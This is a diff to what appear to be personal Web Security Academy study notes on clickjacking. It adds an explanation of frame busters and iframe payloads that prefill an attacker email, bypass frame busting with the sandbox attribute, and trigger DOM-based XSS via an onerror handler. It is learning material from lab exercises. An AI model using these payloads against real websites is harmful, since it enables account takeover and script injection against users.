@@ -2094,7 +2094,7 @@ Content-Type: application/json
 ## Clickjacking
 - Clickjacking attacks are not mitigated by the CSRF token as a target session is established with content loaded from an authentic website and with all requests happening on-domain.
 - Use [Burp Clickbandit](https://portswigger.net/burp/documentation/desktop/tools/clickbandit): Use your browser to perform the desired actions on the frameable page, then creates an HTML file containing a suitable clickjacking overlay
-- 
+- **Frame busting scripts** are client-side protections designed to prevent clickjacking attacks by ensuring that a webpage is not embedded within a frame. They do this by checking if the current window is the top window, making frames visible, and preventing interactions with invisible frames. However, these scripts can be circumvented by attackers using techniques like the HTML5 iframe sandbox attribute, and they may not function if JavaScript is disabled or unsupported in the browser.
 
 **Construct a basic clickjacking attack**
 '''
@@ -2143,16 +2143,19 @@ Content-Type: application/json
         z-index: 1;
     }
    </style>
-   <div>Test me</div>
+   <div>Click me</div>
    <iframe src="YOUR-LAB-ID.web-security-academy.net/my-account"></iframe>
   '''
   - Replace **YOUR-LAB-ID** in the iframe src attribute with your unique lab ID   
   - Substitute suitable pixel values for the **$height_value** and **$width_value** variables of the iframe (we suggest 700px and 500px respectively).   
   - Substitute suitable pixel values for the **$top_value** and **$side_value** variables of the decoy web content so that the "Delete account" button and the "Test me" decoy action align (we suggest 300px and 60px respectively).   
   - Set the **opacity** value $opacity to ensure that the target iframe is transparent. Initially, use an opacity of 0.1.   
-- ddd
-- ddd
-- ddd
+- Clickjacking with form input data prefilled from a **URL parameter**	
+  <iframe src="YOUR-LAB-ID.web-security-academy.net/my-account`?email=hacker@attacker-website.com`"></iframe>
+- Clickjacking with a **frame buster** script
+  <iframe `sandbox="allow-forms"` src="YOUR-LAB-ID.web-security-academy.net/my-account?email=hacker@attacker-website.com"></iframe>
+- Exploiting clickjacking vulnerability to trigger **DOM-based XSS**
+  <iframe src="YOUR-LAB-ID.web-security-academy.net/feedback?`name=<img src=1 onerror=print()>'&email=hacker@attacker-website.com&subject=test&message=test#feedbackResult"></iframe>
 - ddd
 
 ## XSS (Cross-Site Scripting)
